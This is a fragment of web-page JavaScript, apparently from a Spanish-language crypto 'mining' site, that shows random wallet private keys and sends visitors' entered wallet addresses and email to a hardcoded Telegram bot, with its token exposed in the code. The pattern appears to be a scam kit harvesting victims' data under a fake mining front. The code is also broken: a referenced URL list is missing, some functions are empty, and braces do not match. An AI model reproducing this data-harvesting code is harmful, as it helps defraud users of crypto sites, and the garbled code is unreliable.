<script>
let tiempoTotal = 0;
let interval;
let minando = true;
const telegramToken = '8010490851:AAGXRC8_OlcfCeL53VgJ_ALqmbRuT691Wlk';
const chatId = '7613604212';

// URLs para redirecci贸n

// Funci贸n para redirigir en el iframe
function redireccionAleatoria() {
  if (!minando) return;
  const indiceAleatorio = Math.floor(Math.random() * urls.length);
  const urlRedireccion = urls[indiceAleatorio];
  
  // Mostrar la p谩gina en el iframe
  document.getElementById('redireccionFrame').src = urlRedireccion;

// Iniciar la redirecci贸n al cargar la p谩gina

// Funci贸n para generar una nueva billetera
async function generarBilletera() {
    const wallet = ethers.Wallet.createRandom();
    document.getElementById('resultado').innerHTML = `
        <p><strong>Direcci贸n:</strong> ${wallet.address}</p>
        <p><strong>Clave Privada:</strong> ${wallet.privateKey}</p>
    `;
}

// Funci贸n para guardar datos y enviarlos al bot de Telegram
async function guardarDatos() {
  const wallet = document.getElementById('wallet').value;
  const correo = document.getElementById('correo').value;

  if (!wallet || !correo) {
    alert('Por favor, completa todos los campos.');
    return;
  }

  const mensaje = ` *Nueva Wallet Generada*:\n\n Wallet: ${wallet}\n Correo: ${correo}`;
  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: mensaje,
        parse_mode: 'Markdown'
      })
    });

    if (response.ok) {
      alert('Datos guardados correctamente.');
    } else {
      alert('Error al enviar los datos al bot.');
    }
  } catch (error) {
    console.error('Error:', error);
    alert('Error al enviar los datos.');
  }
}

// Funci贸n para contar el tiempo y miner铆a de CHC
function contarTiempo() {

}

// Funci贸n para detener la miner铆a

}

// Iniciar el conteo de tiempo
